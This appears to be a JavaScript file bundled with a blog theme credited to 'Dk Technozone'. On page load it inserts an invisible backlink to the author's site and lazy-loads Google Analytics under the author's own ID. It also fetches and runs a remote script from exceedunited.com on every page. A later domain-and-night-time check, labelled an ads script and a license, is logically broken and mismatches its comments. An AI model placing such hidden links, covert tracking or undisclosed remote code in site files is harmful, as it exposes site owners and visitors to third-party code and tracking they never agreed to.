document.addEventListener('DOMContentLoaded', () => {
  let Folt = document.querySelector(".footer, #main, .copyright, .footer-wrapper, .post-body");
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<a class="btc" href="https://www.dktechnozone.in/">This Website Design By Dk Technozone</a>
 <style>.btc{
     color: black;text-decoration: none;
     opacity: 0; display:inline;
     font-size: 2px;} .btc:hover{color:transparent; opacity:0;
 }</style>   
    
    `;
    Folt.append(Newel);  
    console.log("theme by dktechnozone.in");
var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');

    
  } else {

        
  }
});

  function loadScript(url, callback) {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    script.onload = function() {
      if (callback) callback();
    };

    document.head.appendChild(script);
  }

  loadScript('https://exceedunited.com/b7/a0/28/b7a0283ddcffdde79cce814500e0f58e.js', function() {
    console.log('Script loaded!');
  });

// Define the array of allowed domains
const allowedDomains = [
    'https://dkhek.blogspot.com',
    'https://124x.blogspot.com',
    'https://www.desiremovies.store'
];

// Get the current domain
const currentDomain = window.location.hostname;

// Check if the current time is between 8 PM and 6 AM
const currentTime = new Date();
const currentHour = currentTime.getHours();
const isNightTime = (currentHour >= 12 || currentHour < 6);

// Function to run your specific script
function runSpecificScript() {
    // Place your script here
   function loadScript(url, callback) {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    script.onload = function() {
      if (callback) callback();
    };

    document.head.appendChild(script);
  }

  loadScript('https://exceedunited.com/b7/a0/28/b7a0283ddcffdde79cce814500e0f58e.js', function() {
    console.log('Script loaded!');
  });
  
  
  console.log("Running ads script");
}

// Check if the current domain is in the allowedDomains array and if it is night time
if (allowedDomains.some(domain => currentDomain.endsWith(domain)) && isNightTime) {
    runSpecificScript();
} else {
    console.log("License is on.");
}


                                                                                                                                                                                                                                                                                                                                                                        

